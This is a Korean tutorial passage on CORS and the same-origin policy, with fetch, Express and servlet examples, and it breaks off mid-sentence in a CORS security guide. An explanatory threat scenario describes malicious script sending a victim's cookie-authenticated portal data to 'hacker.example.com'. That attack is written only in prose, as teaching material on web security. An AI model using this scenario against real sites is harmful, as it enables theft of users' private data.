요청 방식에 따라 다른 CORS 발생 여부를 좀 더 이해하기 쉽게 아래 html 코드를 직접 작성하고 테스트 해보자. 
똑같은 서버 도메인으로 부터 check.svg 이미지를 가져오는데, 
각각 <img> 태그의 src 속성으로 가져오는 방식과 자바스크립트에서 ajax 요청으로 가져오는 방식이다.
```
```
<body>
    <img src="https://third-party-test.glitch.me/check.svg" alt="이미지">

    <script>
        fetch('https://third-party-test.glitch.me/check.svg')
            .then(response => response.blob())
            .then(imgBlob => {
                const imageObjectURL = URL.createObjectURL(imgBlob); // 응답 받은 이미지를 blob 객체로 변환
                const img = document.createElement('img'); // 이미지 태그를 생성하고
                img.src = imageObjectURL; // 이미지 경로를 설정한뒤
                document.body.append(img); // html에 추가
            })
    </script>
</body>
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/73.PNG" width="650" height="300" /><br><br>

```
#) CORS 에러 이해
CORS는 함축 단어로써 이를 풀면 Cross-Origin Resource Sharing 이라는 단어로 이루어 져 있다. 
이 문장을 직역하면 "교차 출처 리소스 공유 정책"이라고 해석할 수 있는데,
여기서 교차 출처라고 하는 것은 (엇갈린) 다른 출처를 의미하는 것으로 보면 된다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/74.PNG" width="650" height="300" /><br><br>

```
에러 메세지가 불친절한 것은 아니지만, 
아무래도 배경지식이 부족하다보니 어떻게 해결해야 할지 감이 안잡힌다.

우선 CORS의 다른 출처 리소스 공유 정책(Cross Origin Resource Sharing)이 
어떠한 정책인지에 대해서 알아볼 필요성이 있을 것 같다. 
그 전에 아까부터 출처, 출처 거리는데 이 출처(Origin)이 무엇인지 간단하게 살펴보자.
```

```
#)출처(Origin)란?
우리가 어떤 사이트를 접속할때 인터넷 주소창에 우리는 URL이라는 문자열을 통해 접근하게 된다.

사진과 같이 도메인에서 포트까지가 출처이다.

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/75.PNG" width="650" height="300" /><br><br>

```
즉, 출처(Origin)라는 것은 Protocol과 Host 그리고 Port까지 모두 합친 URL을 의미한다.

간단하게 개발자도구(F12)를 켜서 console.log(location.origin) 으로 
현재사이트의 Origin을 알아낼 수도 있다. 80번포트는 생략된다.

http://localhost:8080 이런식
```

```
#)동일 출처 정책(Same-Origin-Policy)
출처에 대해서 알아 봤으니 이제 본격적으로 Same Origin 정책과 Cross Origin 정책에 대해 알아보자

먼저 SOP(Same Origin Policy) 정책은 단어 그대로 동일한 출처에 대한 정책을 말한다. 

그리고 이 SOP 정책은 '동일한 출처에서만 리소스를 공유할 수 있다.'라는 법률을 가지고 있다. 
즉, 동일 출처(Same-Origin) 서버에 있는 리소스는 자유로이 가져올수 있지만, 
다른 출처(Cross-Origin) 서버에 있는 이미지나 유튜브 영상 같은 리소스는 상호작용이 불가능하다는 말이다.

#)동일 출처 정책이 필요한 이유

그렇다면 동일 출처가 아닌 경우 접근을 차단하는 이유는 뭘까?

사실 출처가 다른 두 어플리케이션이 자유로이 소통할 수 있는 환경은 꽤 위험한 환경이다. 
만일 제약이 없다면, 
해커가 CSRF(Cross-Site Request Forgery)나 XSS(Cross-Site Scripting) 등의 
방법을 이용해서 우리가 만든 어플리케이션에서 해커가 심어놓은 코드가 실행하여 개인 정보를 가로챌 수 있다.

다음은 SOP 정책이 없는 상황에서 악의적인 홈페이지에 접속하는 상황을 가정 한 것이다.

1. 사용자가 악성 사이트에 접속한다.
2. 이때 해커가 몰래 심어놓은 악의적인 자바스크립트가 실행되어, 
   사용자가 모르는 사이에 어느 포털 사이트에 요청을 보낸다.
3. 그럼 포털 사이트에서 해당 브라우저의 쿠키를 이용하여 
   로그인을 하거나 등 상호작용에 따른 개인 정보를 응답 값을 받은뒤, 
   사이트에서 해커 서버(hacker.example.com)로 재차 보낸다.
4. 이외에도 사용자가 접속중인 내부망의 아이피와 포트를 가져오거나, 해커가 사용자 브라우저를 프록시처럼 악용할 수도 있다. 

따라서 이러한 악의적인 경우를 방지하기 위해, 
SOP 정책으로 동일하지 않는 다른 출처의 스크립트가 실행되지 않도록 브라우저에서 사전에 방지하는 것이다.
```

```
#)같은 출처와 다른 출처 구분기준
SOP 정책의 중요도와 필요성에 대해 알았으니,
두개의 출처의 다름 유무를 판단하는 기준이 무엇일까?

출처(Origin)의 동일함은 두 URL의 구성요소 중 Protocol,Host,Port까지만 같으면 동일출처로 판단한다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/76.PNG" width="650" height="300" /><br><br>

```
웹의 흑역사인 Internet Explorer 브라우저는 웃기게도 출처비교시에 Port부분은 무시한다.
이는 곧 보안취약으로 이어지며 왜 그렇게 욕을 얻어먹은지에 대한 이유중에 하나이기도 하다.
```

```
#)출처 비교와 차단은 브라우저가 한다.
새내기 웹개발자들이 착각하는 부분이 위의 출처 구분을 서버가 하는 것으로 오해하는 것이다. 
아무래도 서버에 요청을 했는데 무언가 에러가 뜨면 서버가 문제라고 생각이 들수 밖에 없기 때문이다. 
그러나 출처를 비교하는 로직은 서버에 구현된 스펙이 아닌 브라우저에 구현된 스펙이다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/77.PNG" width="650" height="300" /><br><br>

```
사실 서버는 리소스 요청에 의한 응답은 말끔히 해주었다. 
잘못이 없는 것이다. 
하지만 브라우저가 이 응답을 분석해서 동일 출처가 아니면, 시뻘건 에러를 내뿜는 것이다. 
(사실 서버가 헤더 정보를 덜 줘서 그런것이다. 이는 뒤에서 다룬다)
그래서 브라우저에는 에러가 뜨지만, 
정작 서버 쪽에는 정상적으로 응답을 했다고 하기 때문에 난항은 겪는 것이다. 
즉, 응답 데이터는 멀쩡하지만 브라우저 단에서 받을수 없도록 차단을 한 것이다.

info) 그래서 CORS 에러를 해결하는 방안 중 하나로 크롬 브라우저 설정에 SOP 정책을 비활성화하는
방법이 있긴한데 권장하지는 않는다.

Tip) 브라우저가 정책으로 차단을 한다는 말은, 
     브라우저를 통하지 않고 서버 간에 통신을 할때는 정책이 적용되지 않는다는 말과 같다.
	 즉, 클라이언트 단 코드에서 API 요청을 하는게 아니라, 
	 서버 단 코드에서 다른 출처의 서버로 API 요청을 하면 CORS 에러로부터 자유로워 진다. 
	 그래서 이를 이용한 프록시(Proxy) 서버라는 것이 있다. (후술)
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/78.PNG" width="650" height="300" /><br><br>

```
#)교차 출처 리소스 공유(CrossOrigin Resource Sharing, CORS)
단어 그대로 다른 출처의 리소스 공유에 대한 허용/비허용 정책이다.

아무리 보안이 중요하지만, 
개발을 하다 보면 기능상 어쩔 수 없이 다른 출처 간의 상호작용을 해야 하는 케이스도 있으며, 
또한 실무적으로 다른 회사의 서버 API를 이용해야 하는 상황도 존재한다. 
따라서 이와 같은 예외 사항을 두기 위해 CORS 정책을 허용하는 리소스에 한해 다른 출처라도 받아들인다는 것이다.
```

```
#)우리가 욕했던 CORS는 사실 해결책이었다.
결국 웹개발자를 괴롭히던 시뻘건 에러 메세지는 
사실 브라우저의 SOP 정책에 따라 다른 출처의 리소스를 차단하면서 발생된 에러이며, 

CORS는 다른 출처의 리소스를 얻기위한 해결 방안 이었던 것이다. 
요약하자면 SOP 정책을 위반해도 CORS 정책에 따르면 다른 출처의 리소스라도 허용한다는 뜻이다.
그럼 어떻게 CORS 정책을 따르게 하여 SOP 정책을 회피할 수 있을까? 
이를 알기 위해선 브라우저의 CORS 동작 과정을 살펴 보아야 한다.
```

```
#)브라우저의 CORS 기본동작 살펴보기

1. 클라이언트에서 HTTP 요청의 헤더에 Origin을 담아 전달
  1-1. 기본적으로 웹은 HTTP프로토콜을 이용하여 서버에 요청을 보내게 되는데
  1-2. 이떄 브라우저는 요청 헤더에 Origin이라는 필드에 출처를 함께 담아 보내게 된다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/79.PNG" width="650" height="300" /><br><br>

```
2. 서버는 응답헤더에 Access-Control-Allow-Origin 을 담아 클라이언트로 전달한다.
 2-1.이후 서버가 이 요청에 대한 응답을 할 때 응답 헤더에 
      Access-Control-Allow-Origin이라는 필드를 추가하고 값으로 
	  '이 리소스를 접근하는 것이 허용된 출처 url'을 내려보낸다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/81.PNG" width="650" height="300" /><br><br>

```
3. 클라이언트에서 Origin과 서버가 보내준 Access-Control-Allow-Origin을 비교한다.
 3-1. 이후 응답을 받은 브라우저는 자신이 보냈던 요청의 Origin과 서버가 보내준
      응답의 Access-Control-Allow-Origin을 비교해본 후 차단할지 말지를 결정한다.
 3-2. 만약 유효하지 않다면 그 응답을 사용하지 않고 버린다.(CORS 에러)
```
```
#)결국 CORS 해결책은 서버의 허용이 필요
위의 브라우저의 CORS 동작 과정을 살펴보니, 
길고 길었던 여정의 결론은 서버에서 Access-Control-Allow-Origin 헤더에 
허용할 출처를 기재해서 클라이언트에 응답하면 되는 것이었다. 
즉, 백엔드 개발자가 고쳐야될 부분인 것이다.

info) 그렇다면 클라이언트에서 미리 자바스크립트로 Origin 헤더값을 위조하면 되지않을까 싶지만,
브라우저에서 이를 감지하여 차단하기 때문에 불가능하다.

```

```
#)CORS 작동방식 3가지 시나리오
바로 위에서 살펴본 CORS 동작 흐름은 이해하기 쉽게 하기 위해 기본적인 작동 흐름을 보여준 것이고, 
실제로는 CORS가 동작하는 방식은 한 가지가 아니라 
세 가지의 시나리오에 따라 변경되기 때문에, CORS를 정복하기 위해선 이들을 모두 알 필요가 있다. (공부가 끝이없다 ☹️)
다만 이 부분은 당장 CORS를 해결하는데 있어 필수 지식은 아니지만, 
만일 독자분이 단순 요청을 떠나 쿠키나 토큰과 같은 인증 데이터를 
다른 출처의 서버에 요청을 해야한다면 이 섹션의 지식은 필수이다. 

또한 우리가 인터넷을 배울때 TCP / UDP의 내부 통신 과정을 배웠듯이, 
브라우저의 세부적인 CORS 통신 동작 과정을 살펴봐야 나중에 최적화 작업을 할 수 있기 때문에 학습이 권장되는 바이다.
```

```
#)예비요청(Preflight Request)
사실 브라우저는 요청을 보낼때 한번에 바로 보내지않고, 
먼저 예비 요청을 보내 서버와 잘 통신되는지 확인한 후 본 요청을 보낸다. 

즉, 예비 요청의 역할은 본 요청을 보내기 전에 브라우저 스스로 안전한 요청인지 미리 확인하는 것이다.

이때 브라우저가 예비요청을 보내는 것을 Preflight라고 부르며, 
이 예비요청의 HTTP 메소드를 GET이나 POST가 아닌 OPTIONS라는 요청이 사용된다는 것이 특징이다.
 
예를들어 자바스크립트로 다음 api 요청을 보낸다고 가정해보자.

```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/80.PNG" width="650" height="500" /><br><br>

```
1. 자바스크립트의 fetch() 메서드를 통해 리소스를 받아오려고 한다.
2. 브라우저는 서버로 HTTP OPTIONS 메소드로 예비요청(Preflight)을 먼저보낸다.
 2-1. Origin 헤더에 자신의 출처를 넣는다.
 2-2. Access-Control-Request-Method 헤더에 실제요청에 사용할 메소드를 설정한다.
 2-3. Access-Control-Request-Headers 헤더에 실제요청에 사용할 헤더들을 설정한다.
3. 서버는 이 예비요청에 대한 응답으로 어떤 것을 허용하고 어떤 것을 금지하고 있는지에 대한
   헤더정보를 담아서 브라우저로 보내준다.
 3-1. Access-Control-Allow-Origin 헤더에 허용되는 Origin들의 목록을 설정한다.
 3-2. Access-Control-Allow-Methods 헤더에 허용되는 메소드들의 목록을 설정한다.
 3-3. Access-Control-Allow-Headers 헤더에 허용되는 헤더들의 목록을 설정한다.
 3-4. Access-Control-Max-Age 헤더에 해당 예비 요청이 브라우저에 캐시 될 수 있는 시간을 초 단위로 설정한다.

4. 이후 브라우저는 보낸요청과 서버가 응답해준 정책을 비교하여, 해당 요청이 안전한지 확인하고
   본 요청을 보내게 된다.
5. 서버가 본 요청에 대한 응답을 하면 최종적으로 이 응답 데이터를 자바스크립트로 넘겨준다.
```

```
#)개발자 도구에서 예비 요청 확인하기
네트워크 탭에서 간단히 재현이 가능한데,
실제로 자바스크립트 코드로 api 요청을 보내면, 크롬 개발자 도구에서 클라이언트와 서버가
본 요청(xhr)을 보내기 전에 예비요청(preflight) 통신을 하고 있는 것을 볼 수 있다.

//자바스크립트
> await fetch("http://localhost:4000/users/location-registration", {"method":"DELETE"})
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/82.PNG" width="650" height="600" /><br><br>

```
위의 사진상에는 요청 헤더의 Origin과 응답 헤더의 Access-Control-Allow-Origin 의 
URL값이 서로 같아 다른 출처라도 CORS(다른 출처 리소스 공유)가 허용되서 정상 응답을 받게 된다.

만일 이 둘이 다르게되면 브라우저는 이 요청이 CORS 정책을 위반했다고 판단하고 악명 높은 에러를 내뱉게 되는 것이다.
```
```
#)예비요청의 문제점과 캐싱
요청을 보내기 전에 OPTIONS 메서드로 예비 요청을 보내 보안을 강화하는 목적의 취지는 좋다. 
그러나 결국은 실제 요청에 걸리는 시간이 늘어나게 되어 어플리케이션 성능에 영향을 미치는 크나큰 단점이 있다.

특히 수행하는 API 호출 수가 많으면 많을 수록 예비 요청으로 인해 
서버 요청을 배로 보내게 되니 비용 적인 측면에서 폐가 될 수 있다. 
따라서 브라우저 캐시(Cache)Visit Website 를 이용해 
Access-Control-Max-Age 헤더에 캐시될 시간을 명시해 주면, 이 Preflight 요청을 캐싱 시켜 최적화를 시켜줄 수 있다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/83.PNG" width="650" height="600" /><br><br>

```
Tip) 예비 요청 캐싱 기간에 대해서는, 
파이어폭스 브라우저는 86400초(24시간) 까지 가능하지만 크로미엄 기반 브라우저는 7200초(2시간)이 최대이다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/84.PNG" width="650" height="600" /><br><br>

```
1. 브라우저는 예비(Preflight) 요청을 할때마다, 먼저 Preflight캐시를 확인하여 해당 요청에 대한
응답이 있는지 확인한다.
2. 만일 응답이 캐싱 되어 있지 않다면, 서버에 예비 요청을 보내 인증 절차를 밟는다.
3. 만일 서버로 부터 Access-Control-Max-Age 응답 헤더를 받는다면 그 기간동안 브라우저 캐시에 결과를 저장한다.
4. 다시 요청을 보내고 만일 응답이 캐싱 되어있다면, 예비요청을 서버로 보내지 않고
   대신 캐시된 응답을 사용한다.
```
```
#)단순요청(Simple Request)
단순 요청은 말그대로 예비 요청(Prefilght)을 생략하고 바로 서버에 직행으로 본 요청을 보낸 후, 
서버가 이에 대한 응답의 헤더에 Access-Control-Allow-Origin 헤더를 보내주면 
브라우저가 CORS정책 위반 여부를 검사하는 방식이다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/85.PNG" width="650" height="600" /><br><br>

```
다만, 심플한 만큼 특정 조건을 만족하는 경우에만 예비 요청을 생략할 수 있다.

대표적으로 아래 3가지 경우를 만족할때만 가능하다.

1. 요청의 메소드는 GET,HEAD,POST 중 하나여야 한다.
2. Accept, Accept-Language, Content-Language, Content-Type, 
   DPR, Downlink, Save-Data, Viewport-Width, Width 헤더일 경우 에만 적용된다.
3. Content-Type 헤더가 application/x-www-form-urlencoded, multipart/form-data, 
   text/plain중 하나여야한다. 아닐 경우 예비 요청으로 동작된다.

이처럼 다소 까다로운 조건들이 많기 때문에, 
위 조건을 모두 만족되어 단순 요청이 일어나는 상황은 드물다고 보면 된다.
왜냐하면 대부분 HTTP API 요청은 text/xml 이나 application/json 으로 통신하기 때문에 
3번째 Content-Type이 위반되기 때문이다.

따라서 대부분의 API 요청은 그냥 예비 요청(preflight)으로 이루어진다 라고 이해하면 된다.
```

```
#)인증된 요청(Credentialed Request)
인증된 요청은 클라이언트에서 서버에게 자격 인증 정보(Credential)를 실어 요청할때 사용되는 요청이다.
여기서 말하는 자격 인증 정보란
세션 ID가 저장되어있는 쿠키(Cookie) 혹은 Authorization 헤더에 설정하는 토큰 값 등을 일컫는다.

즉, 클라이언트에서 일반적인 JSON 데이터 외에도 쿠키 같은 인증 정보를 포함해서 
다른 출처의 서버로 전달할때 CORS의 세가지 요청중 하나인 인증된 요청으로 동작된다는 말이며, 
이는 기존의 단순 요청이나 예비 요청과는 살짝 다른 인증 형태로 통신하게 된다.

1. 클라이언트에서 인증 정보를 보내도록 설정하기
기본적으로 브라우저가 제공하는 요청 API 들은 별도의 옵션 없이 
브라우저의 쿠키와 같은 인증과 관련된 데이터를 함부로 요청 데이터에 담지 않도록 되어있다.

이때 요청에 인증과 관련된 정보를 담을 수 있게 해주는 옵션이 바로 credentials 옵션이다.
이 옵션에는 3가지의 값을 사용할 수 있으며, 각 값들이 가지는 의미는 아래와 같다.

옵션값			설명
same-origin  같은 출처 간 요청에만 인증 정보를 담을 수 있다.
include      모든 요청에 인증 정보를 담을 수 있다.
omit		 모든 요청에 인증 정보를 담지 않는다.

만일 이러한 별도의 설정을 해주지 않으면 쿠키 등의 인증 정보는 절대로 자동으로 서버에게 전송되지 않는다.
서버에 인증된 요청을 보내는 방법으로는 fetch 메서드를 사용하거나 axios, jQuery 라이브리리 등 다양하다. 
어떤 메서드를 사용하느냐에 따라 약간 credentials 옵션을 지정하는 문법이 다르니 이들을 모두 소개해 본다.

// fetch 메서드
fetch("https://example.com:1234/users/login", {
	method: "POST",
	credentials: "include", // 클라이언트와 서버가 통신할때 쿠키와 같은 인증 정보 값을 공유하겠다는 설정
    body: JSON.stringify({
        userId: 1,
    }),
})

// axios 라이브러리
axios.post('https://example.com:1234/users/login', { 
    profile: { username: username, password: password } 
}, { 
	withCredentials: true // 클라이언트와 서버가 통신할때 쿠키와 같은 인증 정보 값을 공유하겠다는 설정
})

// jQuery 라이브러리
$.ajax({
	url: "https://example.com:1234/users/login",
	type: "POST",
	contentType: "application/json; charset=utf-8",
	dataType: "json",		
	xhrFields: { 
    	withCredentials: true // 클라이언트와 서버가 통신할때 쿠키와 같은 인증 정보 값을 공유하겠다는 설정
    },
	success: function (retval, textStatus) {
		console.log( JSON.stringify(retval));
	}
});
```
```
//이제 서버입장에서 보자
2. 서버도 마찬가지로 이러한 인증된 요청에 대해 일반적인 CORS 요청과는 다르게 대응해줘야 한다.
 2-1. 응답 헤더의 Access-Control-Allow-Credentials 항목을 true로 설정해야한다. 
 2-2. 응답 헤더의 Access-Control-Allow-Origin 의 값에 와일드카드 문자("*")는 사용할 수 없다.
 2-3. 응답 헤더의 Access-Control-Allow-Methods 의 값에 와일드카드 문자("*")는 사용할 수 없다.
 2-4. 응답 헤더의 Access-Control-Allow-Headers 의 값에 와일드카드 문자("*")는 사용할 수 없다.

즉, 응답의 Access-Control-Allow-Origin 헤더가 와일드카드(*)가 아닌 
분명한 Origin으로 설정되어야 하고, 

Access-Control-Allow-Credentials 헤더는 true로 설정되어야 한다는 뜻이다. 

그렇지 않으면 브라우저의 CORS 정책에 의해 응답이 거부된다. 
(인증 정보는 민감한 정보이기 때문에 출처를 정확하게 설정해주어야 한다)
만일 이를 어길경우 또다른 종류의 CORS 에러 메세지를 접하게 될 것이다.
```

<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/86.PNG" width="650" height="600" /><br><br>

```
#)CORS 3가지 시나리오 동작테스트
현재 어디에서 요청하냐면 https://chuckchoiboi.github.io -> 이 출처를 origin에 등록해야된다.

- Simple Request(에러상황 - 출처가 다르면서 origin 등록필요)
//서버측 작성
app.get('/api/simple/no-origin',(req,res) => {
	res.status(200).json({title: 'Hello World!'})
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/simple/no-origin')

---------------
- Simple Request(조치)
//서버측 작성
app.get('/api/simple/wildcard-origin', (req, res) => {
  res.header("Access-Control-Allow-Origin", "*") //와일드카드 사용
  res.status(200).json({ title: 'Hello World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/simple/wildcard-origin')

-----------------
-Simple Request(조치)
//서버측 작성
app.get('/api/simple/good-origin', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io") //지정해서 작성
  res.status(200).json({ title: 'Hello World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/simple/bad-origin')
```
```
- Preflight Request(에러 - options는 썼으나 delete에대한 메서드가 없음)
//서버측 작성
app.options('/api/preflight/bad-method', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io")
  res.status(204).end()
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/preflight/bad-method', '{"method":"DELETE"}')

--------------
- Preflight Request(에러 - delete메소드도 있으나 origin출처가 잘못됨)
//서버측 작성
app.options('/api/preflight/req-bad-origin', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io")
  res.header("Access-Control-Allow-Methods", "DELETE")
  res.status(204).end()
})

app.delete('/api/simple/req-bad-origin', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://www.website.notcool")
  res.status(200).json({ title: 'Goodbye World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/preflight/req-bad-origin', '{"method":"DELETE"}')

----------------
- Preflight Request(조치)
//서버측 작성
app.options('/api/preflight/good-request', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io")
  res.header("Access-Control-Allow-Methods", "DELETE")
  res.status(204).end()
})

app.delete('/api/simple/good-request', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io")
  res.status(200).json({ title: 'Goodbye World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/preflight/good-request', '{"method":"DELETE"}')
```
```
- Credentialed Request
//서버측 작성(에러 - 인증된요청은 와일드카드를 쓸 수 없다.origin,methods,headers에)
app.get('/api/credentialed/wildcard-origin', (req, res) => {
  res.header("Access-Control-Allow-Origin", "*")
  res.status(200).json({ title: 'Hello World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/credentialed/wildcard-origin', '{"credentials":"include"}')

-----------
- Credentialed Request
//서버측 작성(에러- true가 빠짐)
app.get('/api/credentialed/good-origin', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io")
  res.status(200).json({ title: 'Hello World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/credentialed/good-origin', '{"credentials":"include"}')

--------------
- Credentialed Request
//서버측 작성(조치)
app.get('/api/credentialed/good-request', (req, res) => {
  res.header("Access-Control-Allow-Origin", "https://chuckchoiboi.github.io")
  res.header("Access-Control-Allow-Credentials", "true") //이 부분 추가
  res.status(200).json({ title: 'Hello World!' })
})

//클라이언트측 작성
fetch('https://cors-tutorial-server.up.railway.app/api/credentialed/good-request', '{"credentials":"include"}')
```

```
#)CORS해결방법
- 서버에서 Access-Control-Allow-Origin 헤더 세팅
직접 서버에서 HTTP 헤더 설정을 통해 출처를 허용하게 설정하는 가장 정석적인 해결책이다.
서버의 종류도 노드 서버, 스프링 서버, 아파치 서버 등 여러가지가 있으니, 
이에 대한 각각 해결책을 나열해본다.

각 서버의 문법에 맞게 위의 HTTP 헤더를 추가해 주면 된다.
참고로 CORS에 연관된 HTTP 헤더 값으로는 다음 종류가 있다. (이들을 모두 설정할 필요는 없다)

# 헤더에 작성된 출처만 브라우저가 리소스를 접근할 수 있도록 허용함.
# * 이면 모든 곳에 공개되어 있음을 의미한다. 
Access-Control-Allow-Origin : https://naver.com

# 리소스 접근을 허용하는 HTTP 메서드를 지정해 주는 헤더
Access-Control-Request-Methods : GET, POST, PUT, DELETE

# 요청을 허용하는 해더.
Access-Control-Allow-Headers : Origin,Accept,X-Requested-With,Content-Type,Access-Control-Request-Method,Access-Control-Request-Headers,Authorization

# 클라이언트에서 preflight 의 요청 결과를 저장할 기간을 지정
# 60초 동안 preflight 요청을 캐시하는 설정으로, 첫 요청 이후 60초 동안은 OPTIONS 메소드를 사용하는 예비 요청을 보내지 않는다.
Access-Control-Max-Age : 60

# 클라이언트 요청이 쿠키를 통해서 자격 증명을 해야 하는 경우에 true. 
# 자바스크립트 요청에서 credentials가 include일 때 요청에 대한 응답을 할 수 있는지를 나타낸다.
Access-Control-Allow-Credentials : true

# 기본적으로 브라우저에게 노출이 되지 않지만, 브라우저 측에서 접근할 수 있게 허용해주는 헤더를 지정
Access-Control-Expose-Headers : Content-Length
```

```
#)JSP/Servlet 세팅(톰캣,아파치에서도 설정할 수있다.)
import javax.servlet.*;

public class CORSInterceptor implements Filter {

    private static final String[] allowedOrigins = {
            "http://localhost:3000", "http://localhost:5500", "http://localhost:5501",
            "http://127.0.0.1:3000", "http://127.0.0.1:5500", "http://127.0.0.1:5501"
    };

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;

        String requestOrigin = request.getHeader("Origin");
        if(isAllowedOrigin(requestOrigin)) { //출처가 등록한 Origin과 같으면 아래헤더들 설정
            // Authorize the origin, all headers, and all methods
            ((HttpServletResponse) servletResponse).addHeader("Access-Control-Allow-Origin", requestOrigin);
            ((HttpServletResponse) servletResponse).addHeader("Access-Control-Allow-Headers", "*");
            ((HttpServletResponse) servletResponse).addHeader("Access-Control-Allow-Methods",
                    "GET, OPTIONS, HEAD, PUT, POST, DELETE");

            HttpServletResponse resp = (HttpServletResponse) servletResponse;

            // CORS handshake (pre-flight request)
            if (request.getMethod().equals("OPTIONS")) {
                resp.setStatus(HttpServletResponse.SC_ACCEPTED);
                return;
            }
        }
        // pass the request along the filter chain
        filterChain.doFilter(request, servletResponse);
    }

	//출처가 맞으면 true반환
    private boolean isAllowedOrigin(String origin){
        for (String allowedOrigin : allowedOrigins) {
            if(origin.equals(allowedOrigin)) return true;
        }
        return false;
    }
}
```

```
#)CORS 보안취약점 가이드

다른 출처(Origin)의 서버의 리소스를 제약없이 가져와 사용할 경우 
XSS(Cross-Site Scripting)나 CSRF(Cross-Site Request Fogery)와 같은 스크립팅 공격을 당할 위험성이 있다.

그래서 탄생한 것이 브라우저의 SOP(Same Origin Policy) 정책이다.

하지만 SOP 정책은 오로지 동일한 출처에서만 리소스를 공유할수 있어, 
글로벌한 인터넷 환경에선 이는 너무 제한적이라는 단점이 존재했다. 

따라서 서비스 차원에서 몇몇은 다른 출처라도 리소스 공유를 허용해 주겠다는 것이 바로 CORS(Cross Origin Resource Sharing) 정책이다.

하지만 사용자들의 편의를 위해 탄생한 CORS 정책에 대해, 
서버에서 너무 유연하게 리소스 허용 설정을 하게 될 경우,
 웹어플리케이션의 흐름을 악용하여 타인의 개인정보를 해킹할 위험성이 있게 된다.

이는 당연한 것이, 
원래는 SOP 정책으로 막혔어야할 외부 리소스들이 CORS 정책으로 억지로 뚫어줬으니 공격에 그대로 노출되는건 당연한 수순이다.

즉, 개발자가 CORS 정책을 잘못 구성할 경우 심각한 보안 위협이 될 수 있다는 소리이다.
대표적인 예로 Access-Control-Allow-Origin 헤더에 허용할 도메인들을 일일히 설정하기 귀찮다고 와일드 카드(*)로 퉁치는걸 들 수 있다.
```

```
#)CORS보안문제 예방가이드
1. 와일드카드 사용 금지
모든 도메인을 허용하는 와일드카드의 사용은 아무리귀찮아도 서비스가 전체적으로
공개될 것이 아니라면 사용을 자제해야한다.
```
<img src="https://raw.githubusercontent.com/seongdongjo/JavaStudy/main/%EC%9E%90%EB%B0%94%EA%B8%B0%EC%B4%88%EC%9D%B4%EB%AF%B8%EC%A7%80/87.PNG" width="650" height="600" /><br><br>

```
2. Origin 요청 헤더의 값을 그대로 사용금지
위의 와일드카드(*)를 사용하는 것과 다름이 없는 상황이다.

만일 다른 출처 끼리 쿠키 통신을 해야할때 클라이언트에서 
withCredentialsVisit Website 옵션을 활성화하여야 하는데, 

이때 Access-Control-Allow-Origin 헤더에 와일드카드(*)를 사용하지 못하게 된다. 
이때 쓰는 꼼수 방법이 라우터에 들어온 요청 데이터에 request 객체의 Origin 헤더값을 가져와서 
